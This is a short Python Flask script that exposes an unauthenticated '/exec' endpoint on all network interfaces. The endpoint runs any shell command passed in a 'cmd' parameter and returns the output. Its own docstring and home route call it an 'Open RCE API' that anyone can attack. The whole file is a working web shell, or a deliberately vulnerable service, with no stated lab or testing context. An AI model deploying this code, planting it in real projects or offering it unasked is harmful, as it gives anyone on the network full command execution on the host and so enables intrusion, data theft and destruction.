#!/usr/bin/env python3
"""
Open API for attackers – anyone can execute any command
Usage: GET /exec?cmd=whoami
"""

from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/exec', methods=['GET', 'POST'])
def execute():
    if request.method == 'GET':
        cmd = request.args.get('cmd', 'id')
    else:
        data = request.get_json() or {}
        cmd = data.get('cmd', 'id')
    
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        return jsonify({
            'command': cmd,
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        })
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Timeout', 'command': cmd}), 408
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/')
def home():
    return jsonify({
        'message': 'Open RCE API',
        'usage': '/exec?cmd=whoami',
        'warning': 'This API is completely open – anyone can attack'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
